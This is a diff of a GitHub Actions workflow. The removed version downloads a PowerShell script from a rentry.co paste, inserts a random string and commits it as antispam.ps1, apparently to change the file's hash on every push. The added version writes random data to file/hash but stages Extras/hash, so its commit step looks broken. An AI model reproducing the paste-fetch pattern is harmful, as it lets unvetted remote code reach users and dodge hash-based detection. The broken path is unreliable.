@@ -1,33 +1,34 @@
-name: Update antispam.ps1
+name: Generate Random String on Push to Main
 
 on:
-  push:  # This triggers the workflow on any push event
+  push:
+    branches:
+      - main
+
+permissions:
+  contents: write  # Cấp quyền ghi cho contents (mã nguồn)
 
 jobs:
-  update-antispam:
+  generate-random-string:
     runs-on: ubuntu-latest
 
     steps:
     - name: Checkout repository
-      uses: actions/checkout@v3
+      uses: actions/checkout@v2
+      with:
+        token: ${{ secrets.GITHUB_TOKEN }}
 
-    - name: Fetch content from URL
-      run: curl -s https://rentry.co/bwbfr37y/raw -o rentry_content.txt
-
-    - name: Replace placeholder with random string
-      id: replace
+    - name: Generate random string
       run: |
-        RANDOM_STRING=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | fold -w 10 | head -n 1)
-        sed -i "s/hashrandomhere/$RANDOM_STRING/g" rentry_content.txt
+        mkdir -p file
+        head /dev/urandom | tr -dc A-Za-z0-9 | head -c 1000 > file/hash
 
-    - name: Update antispam.ps1
-      run: |
-        mv rentry_content.txt file/antispam.ps1
-
-    - name: Commit changes
+    - name: Commit and push changes
       run: |
         git config --global user.name 'github-actions'
         git config --global user.email 'github-actions@github.com'
-        git add file/antispam.ps1
-        git commit -m 'Update antispam.ps1 with new random string'
+        git add Extras/hash
+        git commit -m "Add random string to Extras/hash"
         git push
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
